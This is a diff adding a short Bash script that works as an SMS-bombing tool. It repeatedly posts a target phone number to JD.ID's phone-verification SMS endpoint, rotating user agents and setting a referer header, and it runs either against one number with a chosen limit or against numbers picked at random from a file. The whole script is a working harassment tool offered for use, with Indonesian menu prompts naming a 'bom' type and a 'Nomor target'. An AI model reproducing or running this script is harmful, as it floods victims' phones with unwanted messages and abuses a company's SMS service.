@@ -1,0 +1,46 @@
+#!/bin/bash
+
+clear
+
+# http://sc.jd.id/phone/sendPhoneSms
+# http://sc.jd.id/phone/bindingPhone.html
+# phone=$no&smsType=1
+
+# UA=$(cat ua.txt | sort -R | head -1)
+
+jdid(){
+	no="$1"
+	ua=$(cat ua.txt | sort -R | head -1)
+	url="http://sc.jd.id/phone/sendPhoneSms"
+	ref="http://sc.jd.id/phone/bindingPhone.html"
+	send=$(curl -s -A "$ua" -e "$ref" -X POST -d "phone=$no&smsType=1" "$url")
+	printf "[!] $no => $send\n"
+}
+
+echo "Tipe bom : "
+echo "1) single"
+echo "2) bulk bom"
+read -p "Select : " tipe;
+
+if [[ $tipe -eq "1" ]]; then
+	clear
+	printf "#######################\n"
+	read -p "Nomor target: " nomer;
+	read -p "Limit: " limit;
+	printf "\n[+] Start \n\n"
+	for (( i = 0; i < $limit; i++ )); do
+		jdid $nomer
+	done
+elif [[ $tipe -eq "2" ]]; then
+	clear
+	printf "#######################\n"
+	printf "list files: "
+	ls
+	read -p "file nomor: " nomor;
+	read -p "Limit: " llimit;
+	printf "\n[+] Start \n\n"
+	for (( i = 0; i < $llimit; i++ )); do
+		number=$(cat $nomor | sort -R | head -1)
+		jdid $number
+	done
+fi
